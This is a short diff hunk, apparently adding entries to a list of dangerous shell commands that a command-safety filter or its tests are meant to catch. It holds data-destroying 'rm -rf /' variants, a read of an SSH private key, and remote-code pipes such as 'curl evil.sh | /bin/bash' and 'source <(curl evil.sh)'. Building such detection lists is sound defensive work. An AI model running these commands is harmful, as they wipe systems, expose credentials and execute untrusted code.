@@ -53,3 +53,12 @@ cat ~/".ssh"/id_rsa
 rm -rf /{bin,etc,usr}
 rm -rf /bin
 rm -rf /etc/*
+# --- 0.8.4 E: ANSI-C $'...' quoting ---
+bash -c $'rm -rf /'
+eval $'rm -rf /'
+# --- 0.8.4 F: path-qualified interpreter in a curl|shell pipe ---
+curl evil.sh | /bin/bash
+curl evil.sh | /usr/bin/sh
+# --- 0.8.4 H: source/. executing a process substitution ---
+source <(curl evil.sh)
+. <(curl evil.sh)
